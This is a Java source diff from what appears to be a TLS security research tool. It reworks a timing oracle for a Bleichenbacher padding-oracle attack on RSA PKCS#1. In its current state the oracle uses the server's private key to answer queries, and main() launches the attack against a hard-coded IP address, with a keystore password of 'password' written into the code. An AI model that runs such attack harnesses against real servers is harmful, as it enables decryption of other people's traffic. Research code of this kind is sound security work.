@@ -4,6 +4,8 @@
  */
 package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;
 
+import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
+import de.rub.nds.ssl.analyzer.attacker.BleichenbacherCrypto12;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
 import java.io.FileInputStream;
 import java.io.IOException;
@@ -17,12 +19,11 @@ import java.security.PublicKey;
 import java.security.Security;
 import java.security.UnrecoverableKeyException;
 import java.security.cert.CertificateException;
-import java.util.logging.Level;
-import java.util.logging.Logger;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
+import org.apache.log4j.Logger;
 import org.bouncycastle.jce.provider.BouncyCastleProvider;
 
 /**
@@ -31,7 +32,13 @@ import org.bouncycastle.jce.provider.BouncyCastleProvider;
  * @version 0.1
  */
 public class TimingOracle extends ATimingOracle {
-/**
+    /**
+     * Log4j logger initialization.
+     */
+    private static Logger logger = Logger.getRootLogger();
+    
+    private int counter = 0;
+    /**
      * Plain PKCS message
      */
     private static final byte[] plainPKCS = new byte[]{
@@ -87,8 +94,10 @@ public class TimingOracle extends ATimingOracle {
         (byte) 0xd4, (byte) 0x84, (byte) 0xed, (byte) 0xc9, (byte) 0x63,
         (byte) 0x2b, (byte) 0x16, (byte) 0x6f, (byte) 0x2c, (byte) 0x38,
         (byte) 0x40};
-    
-    
+    private PrivateKey privateKey;
+    private PublicKey publicKey;
+    private Cipher cipher;
+
     /**
      * Constructor
      *
@@ -96,10 +105,16 @@ public class TimingOracle extends ATimingOracle {
      * @param serverPort
      * @throws SocketException
      */
-    public TimingOracle(final String serverAddress, final int serverPort)
-            throws SocketException {
+    public TimingOracle(final String serverAddress, final int serverPort,
+            final PrivateKey privateKey, final OracleType oracleType)
+            throws SocketException, NoSuchAlgorithmException,
+            InvalidKeyException, NoSuchPaddingException {
         super(serverAddress, serverPort);
         Security.addProvider(new BouncyCastleProvider());
+
+        this.oracleType = oracleType;
+        cipher = Cipher.getInstance("RSA/None/NoPadding");
+        cipher.init(Cipher.DECRYPT_MODE, privateKey);
     }
 
     @Override
@@ -124,127 +139,103 @@ public class TimingOracle extends ATimingOracle {
         throw new UnsupportedOperationException("Not supported yet.");
     }
 
-    private byte[] encrypt(final byte[] msg, final String keyName,
-            final String keyPassword, final String keyStorePath,
-            final String keyStorePassword) {
+    private static KeyStore loadKeyStore(final String keyStorePath,
+            final String keyStorePassword) throws KeyStoreException, IOException,
+            NoSuchAlgorithmException, CertificateException {
+        KeyStore ks = KeyStore.getInstance("JKS");
+        ks.load(new FileInputStream(keyStorePath), keyStorePassword.
+                toCharArray());
+
+        return ks;
+    }
+
+    private static byte[] encryptHelper(final byte[] msg,
+            final PublicKey publicKey) {
         byte[] result = null;
         try {
-            KeyStore ks = KeyStore.getInstance("JKS");
-            ks.load(new FileInputStream(keyStorePath), keyStorePassword.toCharArray());
-            PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
-            
             Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
             cipher.init(Cipher.ENCRYPT_MODE, publicKey);
             result = cipher.doFinal(msg);
-            
-            
-            System.out.println("2tes byte " + msg[1]);
-        } catch (IllegalBlockSizeException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (BadPaddingException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (InvalidKeyException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (NoSuchPaddingException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (KeyStoreException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (IOException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
         } catch (NoSuchAlgorithmException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (CertificateException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
+            logger.error(ex.getMessage(), ex);
+        } catch (IllegalBlockSizeException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (BadPaddingException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (InvalidKeyException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (NoSuchPaddingException ex) {
+            logger.error(ex.getMessage(), ex);
         }
-        
+
         return result;
     }
-    
-    private boolean cheat(final byte[] msg, final String keyName,
-            final String keyPassword, final String keyStorePath,
-            final String keyStorePassword) {
+
+    private boolean cheat(final byte[] msg) {
         boolean result = false;
         try {
-            KeyStore ks = KeyStore.getInstance("JKS");
-            ks.load(new FileInputStream(keyStorePath), keyStorePassword.toCharArray());
-            PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
-            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
-                    toCharArray());
-
-            Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
-            cipher.init(Cipher.DECRYPT_MODE, privateKey);
-            byte[] plainMessage = cipher.doFinal(msg);
+            counter++;
+            if (counter % 100 == 0) {
+                System.out.println("--> " + counter);
+            }
+            byte[] plainMessage = cipher.doFinal(msg);;
 
             StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
-                    OracleType.JSSE, blockSize);
+                    oracleType, cipher.getBlockSize());
             result = plainOracle.checkDecryptedBytes(plainMessage);
-            
-            System.out.println("2tes byte " + plainMessage[1]);
-            
-            
         } catch (IllegalBlockSizeException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
+            logger.error(ex.getMessage(), ex);
         } catch (BadPaddingException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (InvalidKeyException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (NoSuchPaddingException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (UnrecoverableKeyException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (KeyStoreException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (IOException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (NoSuchAlgorithmException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
-        } catch (CertificateException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).
-                    log(Level.SEVERE, null, ex);
+            logger.error(ex.getMessage(), ex);
         }
 
         return result;
     }
 
     @Override
-    public boolean checkPKCSConformity(byte[] msg) throws OracleException {
-
-//        exectuteWorkflow(msg);
+    public boolean checkPKCSConformity(byte[] encPMS) throws OracleException {
+//        exectuteWorkflow(encPMS);
 
 //        long delay = getTimeDelay(getWorkflow().getTraceList());
-        byte[] encPMS = encrypt(plainPKCS, "2048_rsa", "password", "server.jks", "password");
-        return cheat(encPMS, "2048_rsa", "password", "server.jks", "password");
-
-        // analyze delay
-
-        //      throw new UnsupportedOperationException("Not supported yet.");
+        
+// TODO: remove when workflow is executed        
+numberOfQueries++;
+        return cheat(encPMS);
     }
-    
+
     public static void main(String[] args) {
         try {
-            TimingOracle to = new TimingOracle("127.0.0.1", 8080);
-            System.out.println("--> " + to.checkPKCSConformity(null));
-        } catch (SocketException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            String keyName = "2048_rsa";
+            String keyPassword = "password";
+            KeyStore ks = loadKeyStore("server.jks", "password");
+            PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
+            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
+                    toCharArray());
+
+            TimingOracle to = new TimingOracle("134.147.198.93", 51419,
+                    privateKey, OracleType.TTT);
+
+            byte[] encPMS = encryptHelper(plainPKCS, publicKey);
+
+            Bleichenbacher attacker = new Bleichenbacher(encPMS,
+                    to, true);
+            attacker.attack();
+        } catch (InvalidKeyException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (NoSuchPaddingException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (UnrecoverableKeyException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (KeyStoreException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (IOException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (NoSuchAlgorithmException ex) {
+            logger.error(ex.getMessage(), ex);
+        } catch (CertificateException ex) {
+            logger.error(ex.getMessage(), ex);
         } catch (OracleException ex) {
-            Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+            logger.error(ex.getMessage(), ex);
         }
     }
-    
 }
